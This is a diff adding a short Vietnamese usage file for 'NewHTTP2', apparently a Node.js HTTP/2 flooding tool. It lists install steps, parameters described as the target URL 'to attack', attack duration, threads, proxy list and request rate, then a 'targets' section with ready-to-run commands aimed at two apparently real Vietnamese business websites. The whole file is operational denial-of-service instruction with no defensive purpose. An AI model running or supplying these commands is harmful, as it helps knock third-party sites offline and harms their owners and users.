@@ -1,0 +1,15 @@
+cài đặt
+yum install nodejs
+yum install npm
+npm i randomstring fake-useragent request
+
+  target: URL mục tiêu để tấn công
+  time: Thời lượng của cuộc tấn công tính bằng giây
+  thread: Số lượng luồng sẽ sử dụng cho cuộc tấn công
+  proxylist: Đường dẫn đến tệp chứa danh sách proxy sẽ sử dụng cho cuộc tấn công
+  rps: Số lượng yêu cầu tối đa mỗi giây để gửi. Tối đa 512
+  Example: node NewHTTP2 http://example.com/ 60 10 proxy.txt 100
+
+mục tiêu
+node NewHTTP2 https://gocheap.vn/ 60 20 proxy.txt 10
+node NewHTTP2 https://laixehoanggia.com/ 60 20 proxy.txt 10
